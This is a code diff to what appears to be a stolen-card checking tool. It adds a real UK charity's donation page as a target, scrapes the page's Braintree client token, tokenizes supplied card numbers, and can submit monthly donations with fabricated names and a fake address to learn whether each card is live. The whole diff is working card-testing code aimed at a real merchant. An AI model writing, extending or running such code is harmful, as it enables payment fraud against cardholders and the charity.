@@ -34,6 +34,15 @@ BRAINTREE_LEGACY_SITES = [
         "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
         "type": "drupal",
     },
+    {
+        # A Braintree drop-in on a WordPress theme.  The client token is
+        # in a hidden field of the donation form, and the form posts to
+        # the theme's own checkout handler with the nonce the drop-in
+        # made.
+        "url": "https://cllsupport.org.uk/donate/",
+        "token_pattern": r"name=[\"']clientToken[\"'][^>]*value=[\"']([^\"']+)[\"']",
+        "type": "dropin",
+    },
 ]
 
 BT_GQL = "https://payments.braintree-api.com/graphql"
@@ -190,6 +199,9 @@ mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
       bin
       brandCode
       last4
+      cardholderName
+      expirationMonth
+      expirationYear
       binData {
         prepaid
         healthcare
@@ -833,6 +845,147 @@ def _strip_verdict_word(text):
     return out
 
 
+async def _dropin_check(client, site, cc, mm, yy, cvv, charge=False):
+    """A Braintree drop-in form: the card's data is taken by Braintree.
+
+    The client token is in a hidden field of the page, and the
+    fingerprint inside it is what Braintree is asked about the card
+    with.  Braintree names what it refuses, so the answer is its own.
+
+    With the charge turned on the form is posted as well, and then the
+    merchant takes the money and asks the issuer, so the answer is the
+    issuer's.  That is the charge gate's work, not this gate's.
+
+    Returns (verdict, detail, card_info) or (None, reason, None) when
+    the store could not be asked at all.
+    """
+    base = site.get("url", "")
+    headers_page = {
+        "User-Agent": UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": base,
+    }
+
+    try:
+        r = await client.get(base, headers=headers_page)
+    except Exception as e:
+        return None, "the store could not be reached: %s" % str(e)[:50], None
+    if r.status_code != 200:
+        return None, "the donation page answered %s" % r.status_code, None
+    html = r.text or ""
+
+    # the client token, and the fingerprint inside it
+    match = re.search(site.get("token_pattern") or r"clientToken", html)
+    token = match.group(1) if match else ""
+    fingerprint = ""
+    if token:
+        try:
+            import base64 as _b64
+            dec = json.loads(_b64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8"))
+            fingerprint = dec.get("authorizationFingerprint", "")
+        except Exception:
+            fingerprint = ""
+    if not fingerprint:
+        fingerprint = await _get_bt_auth(client, html, base) or ""
+    if not fingerprint:
+        return None, "the store gave no client token", None
+
+    # the card becomes a payment method
+    payment_nonce, card_info, err = await _tokenize_card(client, fingerprint, cc, mm, yy, cvv,
+                                                          validate=True)
+    if not payment_nonce:
+        reason = err or "the card was not accepted"
+        verdict, wording = _verdict_from_reason(reason)
+        if verdict in ("Approved", "Wait"):
+            verdict = "Declined"
+        return verdict, wording or reason[:80], card_info or None
+
+    if not charge:
+        # Braintree took the card's data and said yes.  Nothing was
+        # charged and the issuer was not asked, and the answer says so.
+        return "Approved", "Accepted by Braintree (no charge)", card_info
+
+    # the form the merchant wants: its own fields, its own amounts and
+    # its own anti-spam marks, and the nonce the drop-in made
+    form = {}
+    for field in re.finditer(r"<input([^>]*)>", html):
+        attrs = field.group(1)
+        name_m = re.search(r"name=[\"']([^\"']+)[\"']", attrs)
+        value_m = re.search(r"value=[\"']([^\"']*)[\"']", attrs)
+        type_m = re.search(r"type=[\"']([^\"']+)[\"']", attrs)
+        if not name_m:
+            continue
+        if type_m and type_m.group(1).lower() == "hidden" and value_m:
+            form[name_m.group(1)] = value_m.group(1)
+
+    amount = site.get("amount") or "1"
+    form.update({
+        "donation_type": "regular",
+        "donation_amount": amount,
+        "donationFreq": "monthly",
+        "first_name": _random_name()[0],
+        "last_name": _random_name()[1],
+        "address_line_1": "145 Marco Street",
+        "address_line_2": "",
+        "town": "Fargo",
+        "county": "Cass County",
+        "postcode": "58104",
+        "telephone": "06534235789",
+        "email": _random_email(),
+        "country": site.get("country") or "GB",
+        "donation_reason": "Donation",
+        "memory": "no",
+        "payment_method_nonce": payment_nonce,
+    })
+
+    action = site.get("action") or ""
+    if not action:
+        m = re.search(r"<form[^>]*id=[\"']donationForm[\"'][^>]*action=[\"']([^\"']+)", html)
+        action = m.group(1) if m else ""
+    if not action:
+        return None, "the store named no checkout handler", None
+
+    try:
+        # The merchant sends the browser to its confirmation page, and
+        # that address says whether the payment went through, so the
+        # redirect is not followed: the answer is in the address.
+        rr = await client.post(action, data=form, follow_redirects=False, headers={
+            **headers_page, "Origin": base,
+            "Content-Type": "application/x-www-form-urlencoded"})
+    except Exception as e:
+        return None, "the store did not answer: %s" % str(e)[:50], None
+
+    body = rr.text or ""
+    location = str(rr.headers.get("location") or "")
+    success = None
+    m = re.search(r"[?&]success=(true|false)", location, re.I)
+    if not m:
+        m = re.search(r"[?&]success=(true|false)", body, re.I)
+    if m:
+        success = m.group(1).lower() == "true"
+
+    if success is True:
+        return "Approved", "the merchant took the card", card_info
+    if success is False:
+        # the reason, when the confirmation page names one
+        reason = _reason_from_body(body) or _reason_from_page(body)
+        if not reason and location:
+            try:
+                rr2 = await client.get(location, headers=headers_page)
+                reason = _reason_from_body(rr2.text or "") or _reason_from_page(rr2.text or "")
+            except Exception:
+                reason = ""
+        return "Declined", reason[:110] or "the merchant refused the card", card_info
+
+    # no answer in the address: fall back to what the page says
+    reason = _reason_from_body(body) or _reason_from_page(body)
+    if reason:
+        status = _classify_response(reason)
+        return status, reason[:110], card_info
+    return "Error", "the store did not say anything about the card", card_info
+
+
 async def _token_check(client, site, cc, mm, yy, cvv):
     """Ask braintree whether the card can be used, and say what it said.
 
@@ -1278,6 +1431,11 @@ async def _check_card_braintree_run(cc, mm, yy, cvv, proxy=None):
             if os.environ.get("B3_ALLOW_DONATION", "").strip() == "1":
                 sites = all_sites()
                 sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)
+            else:
+                # The drop-in stores are always in the list: the form
+                # is the merchant's own, so the merchant takes the money
+                # and asks the issuer, and the answer is the issuer's.
+                sites = [s for s in all_sites() if s.get("type") == "dropin"]
 
             for site_info in sites:
                 site_url = site_info["url"]
@@ -1365,6 +1523,24 @@ async def _check_card_braintree_run(cc, mm, yy, cvv, proxy=None):
                             return f"Declined - Donation Rejected | {info} [{elapsed}s]"
                         else:
                             return f"Declined - Unknown Response | {info} [{elapsed}s]"
+
+                    elif site_type == "dropin":
+                        # A Braintree drop-in on a WordPress theme: the
+                        # client token is in a hidden field and the form
+                        # posts to the theme's own checkout handler with
+                        # the nonce the drop-in made.
+                        verdict, detail, card_info = await _dropin_check(
+                            client, site_info, cc, mm, yy, cvv)
+                        if not verdict:
+                            logger.info(f"BT: {site_url} could not be asked: {detail}")
+                            last_error = detail
+                            continue
+                        info = _parse_card_info(card_info) if card_info else "??"
+                        if verdict == "Approved":
+                            return f"Approved - {detail} | {info} [{elapsed}s]"
+                        if verdict == "Declined":
+                            return f"Declined - {detail} | {info} [{elapsed}s]"
+                        return f"{verdict} - {detail} | {info} [{elapsed}s]"
 
                     elif site_type == "woocommerce":
                         # tea-and-coffee.com — WooCommerce flow (needs proxy that isn't 403)
